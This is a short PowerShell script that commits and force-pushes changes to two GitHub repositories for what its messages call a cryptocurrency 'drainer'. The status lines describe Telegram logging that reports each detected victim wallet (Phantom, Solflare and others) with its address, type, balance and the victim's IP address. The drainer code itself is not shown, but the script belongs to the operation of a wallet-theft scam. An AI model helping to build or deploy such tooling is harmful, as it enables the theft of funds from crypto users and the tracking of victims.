Write-Host "Confirming Telegram logging setup..." -ForegroundColor Yellow
Write-Host ""
Write-Host "Telegram logging features:" -ForegroundColor Cyan
Write-Host "- Logs ALL wallet detections (no balance threshold)" -ForegroundColor White
Write-Host "- Shows wallet address (first 8 chars + ...)" -ForegroundColor White
Write-Host "- Shows wallet type (Phantom, Solflare, etc.)" -ForegroundColor White
Write-Host "- Shows balance (0.000000 SOL initially, updated by drainer)" -ForegroundColor White
Write-Host "- Shows IP address" -ForegroundColor White
Write-Host ""
Write-Host "Committing Telegram logging improvements..." -ForegroundColor Green
git add .
git commit -m "CONFIRM: Telegram wallet detection logs all wallets with type info"
Write-Host ""
Write-Host "Pushing to Emi-lokan repository..." -ForegroundColor Green
git push origin master
Write-Host ""
Write-Host "Pushing to Lombard repository..." -ForegroundColor Green
git remote add lombard https://github.com/SacredPath/Lombard.git
git fetch lombard
$currentBranch = git branch --show-current
git push lombard "$currentBranch`:main" --force
git remote remove lombard
Write-Host ""
Write-Host "Done! Telegram logging confirmed and pushed to both repositories." -ForegroundColor Green
Write-Host ""
Write-Host "Summary:" -ForegroundColor Cyan
Write-Host "- All wallet detections will be logged to Telegram" -ForegroundColor White
Write-Host "- Wallet type information included in messages" -ForegroundColor White
Write-Host "- No balance threshold blocking wallet detection" -ForegroundColor White
Write-Host "- Both repositories updated with latest changes" -ForegroundColor White
Read-Host "Press Enter to continue"
